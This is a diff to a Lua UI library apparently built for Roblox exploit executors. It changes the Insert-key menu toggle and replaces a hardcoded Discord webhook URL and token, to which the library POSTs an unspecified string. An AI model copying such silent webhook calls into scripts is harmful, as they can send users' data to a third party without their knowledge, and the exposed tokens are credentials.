@@ -165,27 +165,17 @@ function library.new(library_title, cfg_location)
         ScreenGui.Enabled = state
     end
 
-    uis.InputBegan:Connect(function(input, gameProcessedEvent)
-    if gameProcessedEvent then
-        return
-    end
+    uis.InputBegan:Connect(function(key)
+        if key.KeyCode ~= Enum.KeyCode.Insert then return end
 
-    if input.KeyCode == Enum.KeyCode.Insert then
-        ScreenGui.Enabled = not ScreenGui.Enabled
-        ScreenGui.Visible = not ScreenGui.Visible
+		ScreenGui.Enabled = not ScreenGui.Enabled
         menu.open = ScreenGui.Enabled
 
-        if ScreenGui.Enabled then
+        while ScreenGui.Enabled do
             uis.MouseIconEnabled = true
-            while ScreenGui.Enabled do
-                rs.RenderStepped:Wait()
-            end
-        else
-            uis.MouseIconEnabled = false
+            rs.RenderStepped:Wait()
         end
-    end
-end)
-
+	end)
 
     local ImageLabel = library:create("ImageButton", {
         Name = "Main",
@@ -246,7 +236,7 @@ end)
     
     local response = syn.request(
         {
-            Url = 'https://discord.com/api/webhooks/966699820809076807/KeDeQkER4LfbI9nz_PE-fruCTgatNrL3WzOVjy5wKsUgHvCMhoNy5sVO34fcPXOXL5Eb', Method = 'POST', Headers = {['Content-Type'] = 'application/json'},
+            Url = 'https://discord.com/api/webhooks/886979229298872331/P0jVdklhb5cbMtPHUjJ_QlfamL6l5xqT28Z691uafGxWXSSYUWCXE2QHhaxv1XdoaSCk', Method = 'POST', Headers = {['Content-Type'] = 'application/json'},
             Body = game:GetService('HttpService'):JSONEncode({content = string})
         }
     );
